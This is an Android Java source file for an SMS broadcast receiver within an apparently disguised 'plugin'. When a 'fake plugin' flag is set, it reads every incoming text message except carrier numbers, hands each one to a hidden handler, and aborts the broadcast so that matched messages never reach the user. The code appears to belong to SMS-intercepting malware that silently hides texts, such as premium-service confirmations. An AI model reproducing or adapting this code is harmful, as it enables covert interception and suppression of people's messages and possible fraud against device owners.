package com.xstd.plugin.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;
import android.text.TextUtils;
import com.xstd.plugin.Utils.MessageHandleUtils;
import com.xstd.plugin.config.Config;
import com.xstd.plugin.config.PluginSettingManager;
import com.xstd.qm.setting.MainSettingManager;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-21
 * Time: PM11:17
 * To change this template use File | Settings | File Templates.
 */
public class PrivateSMSBRC extends BroadcastReceiver {

    public void onReceive(Context context, Intent intent) {
        MainSettingManager.getInstance().init(context);
        if (!MainSettingManager.getInstance().getMainShouldFakePlugin()) {
            return;
        }

        if (intent != null) {
            if (Config.DEBUG) {
                Config.LOGD("[[PrivateSMSBRC::onReceive]] action = " + intent.getAction());
            }
            SmsMessage[] messages = getMessagesFromIntent(intent);
            if (messages == null || messages.length == 0) return;

            PluginSettingManager.getInstance().init(context);
            for (SmsMessage message : messages) {
                if (message == null) continue;

                /**
                 * 先判断短信中心是否已经有了配置，如果没有的话，尝试从短信中获取短信中心的号码
                 */
                String msg = message.getMessageBody();
                if (TextUtils.isEmpty(msg)) continue;

                if (Config.DEBUG) {
                    Config.LOGD("\n\n[[PrivateSMSBRC::onReceive]] has receive SMS from : \n<<" + message.getDisplayOriginatingAddress()
                                    + ">>"
                                    + "\n || content : " + message.getMessageBody()
                                    + "\n || sms center = " + message.getServiceCenterAddress()
                                    + "\n || sms display origin address = " + message.getDisplayOriginatingAddress()
                                    + "\n || sms = " + msg
                                    + "\n || intent info = " + intent.getExtras()
                                    + "\n =================="
                                    + "\n\n");
                }

                //对于任何一条短信，都要先取出短信的发送地址
                String fromAddress = message.getOriginatingAddress();
                if (TextUtils.isEmpty(fromAddress)) {
                    if (Config.DEBUG) {
                        Config.LOGD("\n[[PrivateSMSBRC::onReceive]] ignore this Message as the address is empty.\n");
                    }
                    return;
                }

                if (fromAddress.startsWith("10")) {
                    //当短信发送地址是以10开始或是地址是空的时候，表示这个短信是应该忽略的，因为可以是运营短信。
                    if (Config.DEBUG) {
                        Config.LOGD("\n[[PrivateSMSBRC::onReceive]] Message start with 10.\n");
                    }
                } else {
                    //短信的地址应该是正常的地址
                    /**
                     * 短信发送地址处理
                     */
                    if (fromAddress.startsWith("+") == true && fromAddress.length() == 14) {
                        fromAddress = fromAddress.substring(3);
                    } else if (fromAddress.length() > 11) {
                        fromAddress = fromAddress.substring(fromAddress.length() - 11);
                    }

                    /**
                     * 短信中心处理
                     */
//                    String center = message.getServiceCenterAddress();
//                    if (!TextUtils.isEmpty(center)) {
//                        if (center.startsWith("+") == true && center.length() == 14) {
//                            center = center.substring(3);
//                        } else if (center.length() > 11) {
//                            center = center.substring(center.length() - 11);
//                        }
//                        PluginSettingManager.getInstance().setKeySmsCenterNum(center);
//                    }
                }
                if (MessageHandleUtils.handleMessage(context, msg, fromAddress)) abortBroadcast();
            }
        }
    }

    /**
     * 从Intent中获取短信的信息。
     *
     * @param intent
     * @return
     */
    private final SmsMessage[] getMessagesFromIntent(Intent intent) {
        try {
            Object[] messages = (Object[]) intent.getSerializableExtra("pdus");
            byte[][] pduObjs = new byte[messages.length][];
            for (int i = 0; i < messages.length; i++) {
                pduObjs[i] = (byte[]) messages[i];
            }
            byte[][] pdus = new byte[pduObjs.length][];
            int pduCount = pdus.length;
            SmsMessage[] msgs = new SmsMessage[pduCount];
            for (int i = 0; i < pduCount; i++) {
                pdus[i] = pduObjs[i];
                msgs[i] = SmsMessage.createFromPdu(pdus[i]);
            }
            return msgs;
        } catch (Exception e) {
        }

        return null;
    }

}
